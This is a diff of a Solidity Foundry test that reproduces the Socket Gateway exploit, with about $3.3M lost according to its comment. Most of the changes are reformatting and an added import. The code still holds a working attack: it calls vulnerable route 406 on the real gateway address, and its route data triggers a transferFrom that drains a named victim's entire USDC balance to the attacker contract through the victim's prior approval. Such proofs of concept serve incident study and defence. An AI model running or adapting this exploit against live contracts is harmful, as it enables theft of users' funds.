@@ -3,14 +3,15 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20} from "src/interfaces/IERC20.sol";
 interface ISocketGateway {
-
-    function executeRoute(uint32 routeId, bytes calldata routeData) external payable returns (bytes memory);
-
+    function executeRoute(
+        uint32 routeId,
+        bytes calldata routeData
+    ) external payable returns (bytes memory);
 }
 
 interface ISocketVulnRoute {
-
     function performAction(
         address fromToken,
         address toToken,
@@ -19,7 +20,6 @@ interface ISocketVulnRoute {
         bytes32 metadata,
         bytes calldata swapExtraData
     ) external payable returns (uint256);
-
 }
 
 // @KeyInfo - Total Lost : ~3.3M US$
@@ -37,7 +37,6 @@ interface ISocketVulnRoute {
 
 //In this example i didnt do a batch transferfrom for multiple target addresses,just did one for simplicity
 contract SocketGatewayExp is Test {
-
     address _gateway = 0x3a23F943181408EAC424116Af7b7790c94Cb97a5;
     uint32 routeId = 406; //Recently added vulnerable route id
     address targetUser = 0x7d03149A2843E4200f07e858d6c0216806Ca4242;
@@ -53,13 +52,26 @@ contract SocketGatewayExp is Test {
         USDC.approve(_gateway, type(uint256).max);
     }
 
-    function getCallData(address token, address user) internal view returns (bytes memory callDataX) {
-        require(IERC20(token).balanceOf(user) > 0, "no amount of usdc for user");
-        callDataX =
-            abi.encodeWithSelector(IERC20.transferFrom.selector, user, address(this), IERC20(token).balanceOf(user));
+    function getCallData(
+        address token,
+        address user
+    ) internal view returns (bytes memory callDataX) {
+        require(
+            IERC20(token).balanceOf(user) > 0,
+            "no amount of usdc for user"
+        );
+        callDataX = abi.encodeWithSelector(
+            IERC20.transferFrom.selector,
+            user,
+            address(this),
+            IERC20(token).balanceOf(user)
+        );
     }
 
-    function getRouteData(address token, address user) internal view returns (bytes memory callDataX2) {
+    function getRouteData(
+        address token,
+        address user
+    ) internal view returns (bytes memory callDataX2) {
         callDataX2 = abi.encodeWithSelector(
             ISocketVulnRoute.performAction.selector,
             token,
@@ -75,5 +87,4 @@ contract SocketGatewayExp is Test {
         gateway.executeRoute(routeId, getRouteData(_usdc, targetUser));
         require(USDC.balanceOf(address(this)) > 0, "no usdc gotten");
     }
-
 }
